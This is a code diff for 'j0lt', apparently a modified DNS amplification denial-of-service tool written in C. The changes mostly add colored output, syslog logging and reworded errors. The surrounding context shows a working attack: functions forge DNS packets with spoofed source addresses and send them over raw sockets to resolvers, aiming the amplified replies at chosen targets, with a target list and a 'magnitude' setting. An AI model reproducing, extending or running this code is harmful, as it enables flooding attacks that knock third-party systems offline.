@@ -42,14 +42,15 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <arpa/nameser.h>
-#include <arpa/nameser_compat.h>
-#include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netdb.h>
 #include <unistd.h>
 #include <spawn.h>
-#include <bits/types.h>
-#include <wait.h>
+#include <syslog.h>
+#include <stdarg.h>
+
+#include "colors.h"
+
 
 typedef struct __attribute__((packed, aligned(1)))
 {
@@ -69,9 +70,19 @@ typedef struct __attribute__((packed, aligned(1)))
 #endif
 } PSEUDOHDR;
 
-#define     err_exit(msg) do {  perror(msg);            \
-                                exit(EXIT_FAILURE);     \
-                                } while (0)
+static const char* appname = "j0lt";
+
+inline static void err_exit(const char* fmt, ...)
+{
+	va_list list;
+	va_start(list, fmt);
+	vsyslog(LOG_ERR, fmt, list);
+	size_t len = strlen(fmt);
+	char printffmt[len + 6];
+	sprintf(printffmt, COLOR_RED "%s" COLOR_RESET, fmt);
+	vfprintf(stderr, printffmt, list);
+	exit(EXIT_FAILURE);
+}
 
 #define DEFINE_INSERT_FN(typename, datatype)            \
         bool insert_##typename                          \
@@ -189,32 +200,32 @@ const char* g_menu = {
 		" sc1entist spl0its-r-us     (modified by imper)           \n"
 };
 
-bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out);
+inline static bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out);
 
-size_t readline(char* src, char* dest, size_t srclim, size_t destlim);
+inline static size_t readline(char* src, char* dest, size_t srclim, size_t destlim);
 
-size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
+inline static size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport);
 
-bool insert_dns_header(uint8_t** buf, size_t* buflen);
+inline static bool insert_dns_header(uint8_t** buf, size_t* buflen);
 
-bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
+inline static bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
 
-bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);
+inline static bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport);
 
-bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);
+inline static bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen);
 
-bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
+inline static bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 
-bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
+inline static bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 
-uint16_t j0lt_checksum(const uint16_t* addr, size_t count);
+inline static uint16_t j0lt_checksum(const uint16_t* addr, size_t count);
 
-void
-print_hex(void* data, size_t len);
+inline static void print_hex(void* data, size_t len);
 
-#define EXIT_ERR_MESSAGE "Usage: ./j0lt -t target / -T file_with_targets -p port -m magnitude [OPTION]...\n"
+#define EXIT_ERR_MESSAGE "Usage: " COLOR_MAGENTA "\"%s\""" -t " COLOR_BLUE "target" COLOR_RESET " / -T " COLOR_BLUE "file_with_targets" COLOR_RESET\
+                         " -p " COLOR_BLUE "port" COLOR_RESET " -m " COLOR_BLUE "magnitude" COLOR_RESET " [OPTIONS]...\n"
 
-int proceed(uint16_t spoofport, uint16_t magnitude, uint32_t spoofip, bool debugmode, bool hexmode, bool filereadmode, const char* pathptr)
+inline static int proceed(uint16_t spoofport, uint16_t magnitude, uint32_t spoofip, bool debugmode, bool hexmode, bool filereadmode, const char* pathptr)
 {
 	posix_spawnattr_t attr;
 	posix_spawnattr_t* attrp;
@@ -231,7 +242,7 @@ int proceed(uint16_t spoofport, uint16_t magnitude, uint32_t spoofip, bool debug
 	
 	
 	if (magnitude == 0 || spoofport == 0 || spoofip == 0)
-		err_exit(EXIT_ERR_MESSAGE);
+		err_exit(EXIT_ERR_MESSAGE, appname);
 	
 	attrp = NULL;
 	file_actionsp = NULL;
@@ -327,7 +338,8 @@ typedef struct LINKEDLIST
 
 int main(int argc, char** argv)
 {
-	FILE* fptr;
+	appname = argv[0];
+	
 	char resolvpath[PATH_MAX];
 	const char* pathptr;
 	char* endptr;
@@ -337,7 +349,7 @@ int main(int argc, char** argv)
 	uint16_t spoofport, magnitude = UINT16_MAX;
 	LINKEDLIST* ip_addresses_list = NULL;
 	
-	printf("%s", g_menu);
+	printf(COLOR_BLUE_BG COLOR_BLACK "%s" COLOR_RESET, g_menu);
 	
 	filereadmode = debugmode = hexmode = false;
 	spoofport = spoofip = 0;
@@ -351,7 +363,7 @@ int main(int argc, char** argv)
 					optarg++;
 				spoofip = inet_addr(optarg);
 				if (spoofip == 0)
-					err_exit("* invalid spoof ip");
+					err_exit("(E) Invalid spoof ip");
 				break;
 			case 'T':
 				while (*optarg == ' ')
@@ -366,7 +378,7 @@ int main(int argc, char** argv)
 					{
 						spoofip = inet_addr(ip_addr_str);
 						if (spoofip == 0)
-							err_exit("* invalid spoof ip");
+							err_exit("(E) Invalid spoof ip");
 						*list_iter = calloc(sizeof(LINKEDLIST), 1);
 						(*list_iter)->data = ip_addr_str;
 						list_iter = &(*list_iter)->next;
@@ -377,7 +389,7 @@ int main(int argc, char** argv)
 				errno = 0;
 				spoofport = (uint16_t)strtol(optarg, &endptr, 0);
 				if (!file_ip_input_mode && (errno != 0 || endptr == optarg || *endptr != '\0'))
-					err_exit("* spoof port invalid");
+					err_exit("(E) Spoof port invalid");
 				break;
 			case 'm':
 				errno = 0;
@@ -392,7 +404,7 @@ int main(int argc, char** argv)
 				filereadmode = true;
 				pathsz = strlen(optarg);
 				if (pathsz >= PATH_MAX)
-					err_exit("* path size invalid");
+					err_exit("(E) Path size invalid");
 				memcpy(resolvpath, optarg, pathsz);
 				pathptr = resolvpath;
 				break;
@@ -404,7 +416,8 @@ int main(int argc, char** argv)
 				break;
 			case -1:
 			default: /* '?' */
-				err_exit(EXIT_ERR_MESSAGE);
+				printf(EXIT_ERR_MESSAGE, appname);
+				err_exit("(E) Invalid arguments");
 		}
 	}
 	while ((opt = getopt(argc, argv, g_args)) != -1);
@@ -414,10 +427,10 @@ int main(int argc, char** argv)
 		int ret;
 		for (LINKEDLIST* list = ip_addresses_list; list != NULL; list = list->next)
 		{
-			printf("Processing address \"%s\"", (char*)list->data);
+			printf(COLOR_GREEN "Processing address \"%s\"..." COLOR_RESET, (char*)list->data);
 			spoofip = inet_addr(list->data);
 			if (spoofip == 0)
-				err_exit("* invalid spoof ip");
+				err_exit("(E) Invalid spoof ip");
 			
 			if ((ret = proceed(spoofport, magnitude, spoofip, debugmode, hexmode, filereadmode, pathptr)))
 			{
@@ -433,7 +446,7 @@ int main(int argc, char** argv)
 }
 
 
-bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
+inline static bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
 {
 	long filesize;
 	void* mem;
@@ -456,7 +469,7 @@ bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
 	
 	if (fread(mem, filesize, 1, file) != 1)
 	{
-		printf("* Failed to read data\n");
+		printf("(E) Failed to read data\n");
 		fclose(file);
 		free(mem);
 		return false;
@@ -470,7 +483,7 @@ bool read_file_into_mem(const char* filename, void** data_out, size_t* size_out)
 }
 
 
-size_t readline(char* src, char* dest, size_t srclim, size_t destlim)
+inline static size_t readline(char* src, char* dest, size_t srclim, size_t destlim)
 {
 	size_t i;
 	
@@ -481,7 +494,7 @@ size_t readline(char* src, char* dest, size_t srclim, size_t destlim)
 }
 
 
-size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
+inline static size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spoofport)
 {
 	const char* url = ".";
 	uint8_t pktbuf[NS_PACKETSZ], datagram[NS_PACKETSZ];
@@ -520,7 +533,7 @@ size_t forge_j0lt_packet(char* payload, uint32_t resolvip, uint32_t spoofip, uin
 }
 
 
-bool insert_dns_header(uint8_t** buf, size_t* buflen)
+inline static bool insert_dns_header(uint8_t** buf, size_t* buflen)
 {
 	bool status;
 	uint8_t third_byte, fourth_byte;
@@ -556,7 +569,7 @@ bool insert_dns_header(uint8_t** buf, size_t* buflen)
 }
 
 
-bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
+inline static bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
 {
 	const char* token;
 	char* saveptr, qname[NS_PACKETSZ];
@@ -596,7 +609,7 @@ bool insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_
 }
 
 
-bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
+inline static bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* data, size_t ulen, uint16_t sport)
 {
 	bool status;
 	size_t totalsz = sizeof(PSEUDOHDR) + ulen;
@@ -631,7 +644,7 @@ bool insert_udp_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uin
 }
 
 
-bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
+inline static bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_t daddr, uint32_t saddr, size_t ulen)
 {
 	bool status;
 	uint8_t* bufptr = *buf;
@@ -666,7 +679,7 @@ bool insert_ip_header(uint8_t** buf, size_t* buflen, PSEUDOHDR* pheader, uint32_
 }
 
 
-bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
+inline static bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
 {
 	int raw_sockfd;
 	ssize_t nread;
@@ -674,7 +687,7 @@ bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, si
 	
 	raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (raw_sockfd == -1)
-		err_exit("* fatal socket error run using sudo");
+		err_exit("(E) Fatal socket error run using sudo");
 	
 	addr.sin_family = AF_INET;
 	addr.sin_port = uh_dport;
@@ -694,7 +707,7 @@ bool send_payload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, si
 }
 
 
-bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
+inline static bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 {
 	if (*dst_buflen < src_len)
 		return false;
@@ -707,7 +720,7 @@ bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len
 }
 
 
-uint16_t j0lt_checksum(const uint16_t* addr, size_t count)
+inline static uint16_t j0lt_checksum(const uint16_t* addr, size_t count)
 {
 	register uint64_t sum = 0;
 	
@@ -727,7 +740,7 @@ uint16_t j0lt_checksum(const uint16_t* addr, size_t count)
 }
 
 
-void print_hex(void* data, size_t len)
+inline static void print_hex(void* data, size_t len)
 {
 	const uint8_t* d = (const uint8_t*)data;
 	size_t i, j;
